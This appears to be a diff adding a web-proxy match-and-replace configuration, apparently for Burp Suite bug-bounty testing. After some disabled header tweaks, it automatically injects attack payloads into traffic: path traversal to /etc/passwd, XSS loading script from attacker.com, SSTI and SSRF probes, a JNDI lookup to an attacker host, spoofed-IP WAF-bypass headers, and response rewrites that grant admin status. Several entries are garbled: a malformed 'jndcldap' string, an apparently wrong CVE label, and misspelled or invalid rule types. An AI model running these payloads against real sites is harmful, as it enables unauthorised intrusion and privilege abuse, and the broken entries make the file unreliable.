@@ -1,0 +1,322 @@
+{
+    "proxy":{
+        "match_replace_rules":[		
+			{
+                "comment":"Emulate IE",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+            },
+            {
+                "comment":"Emulate iOS",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3"
+            },
+            {
+                "comment":"Emulate Android",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
+            },
+            {
+                "comment":"Require Non-Cached Response",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^If-Modified-Since.*$"
+            },
+            {
+                "comment":"Require Non-Cachedon-cached Response",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^If-None-Match.*$"
+            },
+            {
+                "comment":"Hide Referer Header",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^Referer.*$"
+            },
+            {
+                "comment":"Require Non-Compressed Responses",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^Accept-Encoding.*$"
+            },
+            {
+                "comment":"Ignore Cookies",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"response_header",
+                "string_match":"^Set-Cookie.*$"
+            },
+            {
+                "comment":"Rewrite Host Header",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^Host: foo.example.org$",
+                "string_replace":"Host: bar.example.org"
+            },
+            {
+                "comment":"Add Spoofed CORS Origin",
+                "enabled":false,
+                "is_simple_match":true,
+                "rule_type":"request_header",
+                "string_replace":"Origin: foo.example.org"
+            },
+            {
+                "comment":"Remove HSTS Headers",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"response_header",
+                "string_match":"^Strict\\-Transport\\-Security.*$"
+            },
+            {
+                "comment":"Disable Browser XSS Protection",
+                "enabled":false,
+                "is_simple_match":true,
+                "rule_type":"response_header",
+                "string_replace":"X-XSS-Protection: 0"
+			},
+			{
+				"comment":"Show Hidden UI",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"response body",
+                "string_match":"hidden",
+                "string_replace":"hizzen"
+			},
+			{
+				"comment":"Show Hidden UI",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"response body",
+                "string_match":"display: none",
+                "string_replace":"display: n0ne"
+			},
+			{
+				"comment":"Change Disable to Enable",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"response body",
+                "string_match":"disable",
+                "string_replace":"enable"
+			},
+			{
+				"comment":"Changing Role from Normal User to Admin",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"response body",
+                "string_match":"admin: false",
+                "string_replace":"admin: true"
+			},
+			{
+				"comment":"Make Email Verified",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"response body",
+                "string_match":"email_verify: false",
+                "string_replace":"email_verify: true"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Forwarded-Host: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Forwarded-Port: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Forwarded-By: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Forwarded-Scheme: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Frame-Options: Allow"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Client-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Real-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Originating-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Remote-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Remote-Addr: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"X-Cluster-Client-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"True-Client-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"Client-IP: 127.0.0.1"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"Origin: null"
+			},
+			{
+				"comment":"Bypass WAF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"Origin: Domain.attacker.com"
+			},
+			{
+				"comment":"Finding IDOR",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Body",
+                "string_match":"id=1",
+                "string_replace":"id=12"
+			},
+			{	"comment":"LFI Request Param Value",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Param Value",
+                "string_match":".*",
+                "string_replace":"..//..//..//..//..//..//..//..//..//..//..//etc//passwd"
+			},
+			{
+				"comment":"Easy Replace XSS Payload",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"xss_payload",
+                "string_replace":"><script src=https://attacker.com></script>"
+			},
+			{	"comment":"SSTI Request Param Value",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Param Value",
+                "string_match":".*",
+                "string_replace":"{{2548*70}}"
+			},
+			{	"comment":"Reqeust Frist Line WCD",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Reqeust Frist Line",
+                "string_match":"([^/\s]+\.(?:jpg|png|gif|css|js))",
+                "string_replace":"nonexistent.js"
+			},
+			{	"comment":"Server Side Request Forgery SSRF",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request String",
+                "string_match":"(https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|www\.[a-zA-Z0-9]+\.[^\s]{2,})",
+                "string_replace":"https://<Your-OoB-Server>"
+			},
+			{
+                "comment":"Easy replace XSS payload",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request_Header",
+                "string_match":"xss_payload",
+                "string_replace":"\"><svg/onload=alert(1)>"
+            },
+			{
+				"comment":"CVE-2021-44221",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"^User-Agent:*$",
+                "string_replace":"User-Agent: ${jndcldap://attackerserver.com.com/x}"
+			},
+			{
+				"comment":"Add UserName HackerOne",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"Request Header",
+                "string_match":"",
+                "string_replace":"Header-HackerOne:anonymous"
+			}
+		]
+	}
+}	
